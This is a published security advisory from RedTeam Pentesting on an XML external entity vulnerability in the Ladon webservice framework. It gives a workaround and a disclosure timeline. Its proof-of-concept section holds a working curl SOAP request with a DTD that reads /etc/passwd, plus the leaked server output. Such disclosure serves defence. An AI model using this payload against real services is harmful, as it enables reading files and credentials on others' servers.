@@ -1,0 +1,246 @@
+Advisory: XML External Entity Expansion in Ladon Webservice
+
+Attackers who can send SOAP messages to a Ladon webservice via the HTTP
+interface of the Ladon webservice can exploit an XML external entity expansion
+vulnerability and read local files, forge server side requests or overload the
+service with exponentially growing memory payloads.
+
+
+Details
+=======
+
+Product: Ladon Framework for Python
+Affected Versions: 0.9.40 and previous
+Fixed Versions: none
+Vulnerability Type: XML External Entity Expansion
+Security Risk: high
+Vendor URL: http://ladonize.org
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-008
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+"Ladon is a framework for exposing methods to several Internet service
+protocols. Once a method is ladonized it is automatically served through all
+the interfaces that your ladon installation contains. Ladon's interface
+implemetations are added in a modular fashion making it very easy [sic] extend
+Ladon's protocol support. Ladon runs on all Major OS's[sic] (Windows, Mac and
+Linux) and supports both Python 2 and 3."
+
+From the vendor's website[1]
+
+
+More Details
+============
+
+Ladon allows developers to expose functions of a class via different
+webservice protocols by using the @ladonize decorator in Python. By
+using the WSGI interface of a webserver or by running the Ladon command
+line tool "ladon-2.7-ctl" with the command "testserve" and the name of
+the Python file, the webservices can be accessed via HTTP.
+
+As a simple example, the following Python file "helloservice.py" was
+implemented:
+
+------------------------------------------------------------------------
+from ladon.ladonizer import ladonize
+
+class HelloService(object):
+
+    @ladonize(unicode, rtype=unicode)
+    def sayhello(self, uid):
+        return u"Hello {0}".format(uid)
+------------------------------------------------------------------------
+
+This function can then be run as a ladon webservice via the following
+command:
+
+------------------------------------------------------------------------
+ladon-2.7-ctl testserve helloservice.py -p 8000
+------------------------------------------------------------------------
+
+This enables access to the "sayhello"-function via SOAP- and JSON-APIs.
+
+The following command will send an HTTP SOAP request, which will trigger the
+function:
+
+------------------------------------------------------------------------
+curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://localhost:8888/HelloService/soap11/sayhello\"' \
+--data-binary $'<soapenv:Envelope 
+xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:HelloService\"><soapenv:Header/><soapenv:Body>
+<urn:sayhello soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">RedTeam Pentesting</uid>
+</urn:sayhello></soapenv:Body></soapenv:Envelope>' \
+'http://localhost:8888/HelloService/soap11' | xmllint --format -
+------------------------------------------------------------------------
+
+This will generate the following output:
+
+------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+   xmlns:ns="urn:HelloService" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+    <ns:sayhelloResponse>
+      <result>Hello RedTeam Pentesting</result>
+    </ns:sayhelloResponse>
+  </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+------------------------------------------------------------------------
+
+The SOAP-API of this service is susceptible to an XML external entity
+expansion.
+
+
+Proof of Concept
+================
+
+By including a DTD in the XML SOAP request, attackers are able to include
+external entities in the response of the server. In the case of the simple
+service the inclusion of the following DTD will result in the exposure of the
+"/etc/passwd"-file on the server:
+
+------------------------------------------------------------------------
+<?xml version="1.0"?>
+<!DOCTYPE uid [
+    <!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+------------------------------------------------------------------------
+
+The following command exploits this vulnerability by including the &passwd;
+entity as the username in the request:
+
+------------------------------------------------------------------------
+curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://localhost:8888/HelloService/soap11/sayhello\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
+<soapenv:Body>
+<urn:sayhello soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&passwd;</uid>
+</urn:sayhello>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://localhost:8888/HelloService/soap11' | xmllint --format -
+------------------------------------------------------------------------
+
+The server answers with a response containing the passwd-file:
+
+------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+ xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+ xmlns:ns="urn:HelloService"
+ xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+    <ns:sayhelloResponse>
+      <result>Hello root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:[...]</result>
+    </ns:sayhelloResponse>
+  </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+The Python package defusedxml [2] can be used to monkey patch the code to
+prevent XML vulnerabilities.  The following workaround can be included in the
+code, which prevents exploitation:
+
+------------------------------------------------------------------------
+[...]
+import defusedxml
+defusedxml.defuse_stdlib()
+[...]
+------------------------------------------------------------------------
+
+
+Fix
+===
+
+Currently no fix is available.
+
+
+Security Risk
+=============
+
+Attackers are able to read local files on the server of the webservice
+with the privileges of the webservice. Furthermore, attackers are able
+to create HTTP request from the webservice to other services on the
+Internet or the local network. It is likely that attackers are able to
+gain access to credentials for database services used by the webservice.
+Attackers may also be able to cause a denial-of-service attack against
+the respective webservice. Depending on the data stored on the
+vulnerable system and the relevance of the webservice, this
+vulnerability may pose a high risk.
+
+
+Timeline
+========
+
+2016-11-29 Vulnerability identified
+2016-11-29 Customer notified vendor
+2017-07-10 Customer fixed problem in their own product
+2017-07-21 RedTeam Pentesting notified vendor
+2017-08-11 RedTeam Pentesting asked vendor for status update
+2017-09-08 RedTeam Pentesting asked vendor for status update and announced
+           public release for end of October
+2017-10-09 RedTeam Pentesting asked vendor for status update
+2017-11-03 Advisory released (no reply from vendor to status update requests)
+
+
+References
+==========
+
+[1] http://ladonize.org
+[2] https://pypi.python.org/pypi/defusedxml
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting GmbH is looking for more penetration testers to join
+our team. If you are interested in working for RedTeam Pentesting in
+Aachen, please visit the respective section of our website.
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Dennewartstr. 25-27                       Fax : +49 241 510081-99
+52068 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschaftsfuhrer:                       Patrick Hof, Jens Liebchen
